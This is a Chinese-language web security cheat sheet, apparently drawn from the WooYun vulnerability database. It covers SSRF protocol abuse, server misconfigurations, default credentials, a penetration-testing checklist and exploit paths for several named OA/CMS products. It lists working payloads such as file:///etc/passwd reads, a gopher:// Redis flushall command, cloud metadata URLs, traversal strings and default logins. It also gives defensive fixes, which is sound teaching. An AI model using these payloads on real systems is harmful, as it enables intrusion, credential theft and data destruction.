# Web 安全 - SSRF、服务器配置错误、综合 Checklist

> 来源: WooYun 漏洞库 | 拆自 web-file-infra.md（SSRF + 配置错误 + Checklist + CMS/URL 附录）

## 四、SSRF与协议利用

### 4.1 漏洞本质

```
SSRF本质: 服务端代为发起请求,攻击者控制请求目标
风险: 内网探测 -> 内部服务访问 -> 文件读取 -> 命令执行
```

### 4.2 常见触发点

- 文件下载功能中的url参数
- 图片加载/代理功能
- 网页预览/截图功能
- 导入URL功能
- Webhook/回调配置

### 4.3 协议利用

```bash
# file:// - 任意文件读取
file:///etc/passwd
file:///C:/windows/win.ini

# dict:// - 端口探测/服务交互
dict://127.0.0.1:6379/info     # Redis
dict://127.0.0.1:11211/stats   # Memcached

# gopher:// - 构造任意TCP请求
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall

# http:// - 内网探测
http://127.0.0.1:8080
http://169.254.169.254/latest/meta-data/  # 云元数据
```

### 4.4 绕过技巧

```bash
# IP变形绕过
127.0.0.1 -> 0x7f000001 -> 2130706433 -> 017700000001 -> 127.1
# DNS重绑定: 解析到外部IP再快速切换到127.0.0.1
# 短链接/302跳转: 通过外部URL跳转到内网地址
```

### 4.5 防御措施

1. 白名单限制: 限制请求目标域名/IP
2. 协议限制: 仅允许http/https
3. 内网隔离: 禁止请求RFC1918地址和127.0.0.1
4. DNS解析验证: 解析后再次校验IP归属
5. 禁用重定向: 或限制重定向次数并再次校验

---

## 五、服务器配置错误

### 5.1 解析配置错误

| 问题 | 风险 | 检查方法 |
|-----|------|---------|
| IIS 6.0解析漏洞未修复 | `shell.asp;.jpg`可执行 | 上传含分号文件名测试 |
| Nginx cgi.fix_pathinfo=1 | `/img.jpg/.php`解析为PHP | 上传图片访问`/img.jpg/x.php` |
| Apache多后缀解析 | `shell.php.xxx`被解析 | 上传双扩展名文件测试 |
| 上传目录可执行脚本 | Webshell直接运行 | 上传脚本文件测试 |
| 目录列表开启 | 暴露所有文件 | 访问目录URL查看 |

### 5.2 权限配置错误

| 问题 | 风险 | 修复 |
|-----|------|------|
| Web进程高权限运行 | 提权后直接root | 使用低权限用户运行 |
| 上传目录777权限 | 任意写入+执行 | 设置644/755 |
| 配置文件可读 | 凭证泄露 | 移出Web目录,限制权限 |
| 管理后台无IP限制 | 公网可访问 | IP白名单/VPN |

### 5.3 默认配置风险

```bash
# 默认管理后台路径
/admin/ | /manager/ | /console/ | /system/
/phpmyadmin/ | /adminer.php

# 默认凭证 (高频)
admin/admin | admin/123456 | admin/admin123
root/root | test/test

# 默认调试端口
8080 (Tomcat) | 9090 (管理) | 3306 (MySQL外网)
6379 (Redis无密码) | 27017 (MongoDB无认证)
```

### 5.4 Spring Boot Actuator泄露

```bash
/actuator/env          # 环境变量(含密码)
/actuator/configprops  # 配置属性
/actuator/heapdump     # 堆内存转储(含敏感数据)
/actuator/mappings     # 所有URL映射
```

---

## 六、综合实战Checklist

### 6.1 文件上传测试

- [ ] 扫描常见编辑器路径(FCKeditor/eWebEditor/UEditor)
- [ ] 禁用JavaScript测试前端验证
- [ ] 测试扩展名绕过: 大小写/双写/特殊后缀/%00截断/分号截断
- [ ] 修改Content-Type为image/jpeg
- [ ] 添加GIF89a文件头 / 制作图片马
- [ ] 识别服务器类型,测试对应解析漏洞
- [ ] 测试.htaccess/.user.ini上传劫持解析
- [ ] 分析文件命名规则,测试路径爆破
- [ ] 测试竞争条件上传

### 6.2 文件遍历测试

- [ ] 识别文件相关参数(filename/path/file/url/download)
- [ ] 基础遍历: `../../../../../etc/passwd`
- [ ] Windows测试: `..\..\..\..\..\windows\win.ini`
- [ ] Java Web: `../WEB-INF/web.xml`
- [ ] URL编码绕过: `%2e%2e%2f` / 双重编码 `%252e%252e%252f`
- [ ] Unicode绕过: `%c0%ae%c0%ae/`
- [ ] 空字节截断: `../etc/passwd%00.jpg`
- [ ] 绝对路径: `/etc/passwd` / `file:///etc/passwd`

### 6.3 信息泄露扫描

- [ ] 版本控制: `/.git/config` `/.svn/entries` `/.svn/wc.db`
- [ ] 备份文件: `/wwwroot.rar` `/www.zip` `/backup.sql` `/{domain}.zip`
- [ ] 配置备份: `/config.php.bak` `/web.config.bak` `/.env.bak`
- [ ] 环境文件: `/.env` `/.env.production`
- [ ] 探针文件: `/phpinfo.php` `/info.php` `/test.php`
- [ ] 日志文件: `/ctp.log` `/debug.log` `/storage/logs/`
- [ ] 管理界面: `/phpmyadmin/` `/adminer.php` `/swagger-ui.html`
- [ ] Spring Boot: `/actuator/env` `/actuator/heapdump`
- [ ] Google Hacking语法辅助搜索

### 6.4 SSRF测试

- [ ] 识别URL/代理/回调参数
- [ ] 测试file:///etc/passwd协议读取
- [ ] 测试内网地址: http://127.0.0.1:port
- [ ] 云元数据: http://169.254.169.254/latest/meta-data/
- [ ] IP变形绕过: 十六进制/十进制/省略写法
- [ ] DNS重绑定/302跳转绕过

---

## 附录A: 高危CMS漏洞速查

| CMS/系统 | 漏洞类型 | 路径 | 条件 |
|---------|---------|------|------|
| 万户OA ezOffice | 任意上传 | `/defaultroot/dragpage/upload.jsp` | %00截断 |
| 用友协作平台 | 任意上传 | `/oaerp/ui/sync/excelUpload.jsp` | 绕JS+爆破文件名 |
| 金蝶GSiS | 任意上传 | `/kdgs/core/upload/upload.jsp` | 注册用户 |
| 金智教育epstar | 文件遍历 | `/epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml` | 无需认证 |
| 致远OA | 日志泄露 | `/ctp.log` | 直接访问 |


## 附录C: 通用漏洞URL模式

```bash
# PHP文件遍历
/down.php?filename=../../../etc/passwd
/pic.php?url=[base64编码路径]

# JSP文件遍历
/download.jsp?path=../WEB-INF/web.xml
/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml

# ASP/ASPX文件遍历
/DownLoad.aspx?Accessory=../web.config
/download.ashx?file=../../../web.config

# Resin特有
/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd
```

---

> **供应链/云部署/框架CVE** → 已迁移至 [web-deployment-security.md](web-deployment-security.md)
> **CORS/GraphQL/HTTP走私/WebSocket/OAuth** → 已迁移至 [web-modern-protocols.md](web-modern-protocols.md)

*基于WooYun漏洞库(88,636条)提炼 | 仅供安全研究与防御参考*
